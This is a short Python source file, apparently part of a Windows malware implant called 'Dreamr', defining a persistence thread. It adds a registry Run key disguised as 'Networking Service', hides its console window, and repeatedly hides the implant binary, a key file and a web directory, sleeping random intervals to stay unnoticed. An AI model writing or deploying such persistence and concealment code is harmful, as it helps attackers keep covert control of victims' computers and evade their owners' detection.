import os
import time
import random
import _winreg
import win32console
import win32gui
import threading

from core import *
from config import *
from Context import Dreamr

class ImplantPersistThread(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		try:
			with _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", _winreg.KEY_SET_VALUE) as reg:
				_winreg.SetValueEx(reg, "Networking Service", 0, _winreg.REG_BINARY, BinaryLocation)
				reg.Close()
		except:
			pass

	# Do things over and over to keep the implant protected
	def run(self):
		while (True):
			if not DEBUG_MODE:

				# keep implant implanted
				print("insist must persist")
				window = win32console.GetConsoleWindow()
				win32gui.ShowWindow(window, False)

				# Things that we really do want to stash away somewhere
				hideFile(WebPath[:1]) # slashes
				hideFile(KeyPath[:1])
				hideFile(sys.argv[0])
			time.sleep(random.randint(1, 420))